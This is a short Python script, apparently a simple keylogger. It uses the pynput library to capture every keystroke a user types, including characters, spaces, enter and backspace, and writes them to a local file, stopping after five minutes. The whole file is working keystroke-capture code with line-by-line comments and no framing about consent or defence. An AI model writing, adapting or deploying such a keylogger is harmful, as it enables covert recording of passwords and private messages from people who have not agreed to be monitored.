import threading
import os
from time import sleep
from pynput import keyboard

# Function to handle key presses
def keyPressed(key):
    try:
        if hasattr(key, 'char') and key.char is not None:  # Check if the key has a character attribute and if it's a printable key.
            log_action(key.char)  
        elif key == keyboard.Key.space:  # Check if the pressed key is the spacebar.
            log_action(' ')  
        elif key == keyboard.Key.enter: # Check if the pressed key is Enter.
            log_action('\n')  
        elif key == keyboard.Key.backspace:   # Check if the pressed key is Backspace.
            handle_backspace()  
    except:
        pass

# Function to log key actions into the file.
def log_action(char):
    with open("keyfile.txt", 'a') as logKey:  # Open the file in append mode.
        logKey.write(char)  # Write the character to the file.

# Function to handle backspace key
def handle_backspace():
    with open("keyfile.txt", 'r+') as logKey:  # Open the file in read and write mode.
        logKey.seek(0, os.SEEK_END)  #method to set position(os.SEEK_END is reference point and 0 is position to move).
        pos = logKey.tell()  # Get the current position.
        if pos > 0:  # If the file is not empty,
            logKey.seek(pos - 1)  # Move the cursor to the position given.
            logKey.truncate()  # cut off everything from the cursor’s current position to the end of the file.

#  Main function
if __name__ == "__main__":
    # Create a Listener object that calls keyPressed on key press.
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()  # Start the keyboard listener in a separate thread.
    Duration = 5 * 60 # set time in seconds i.e 5 * 60 second = 5 minutes
    timer = threading.Timer(Duration, lambda: os._exit(0))
    timer.start()  # Start the timer.
    listener.join()  #twithout this program would reach the end of the script and terminate.
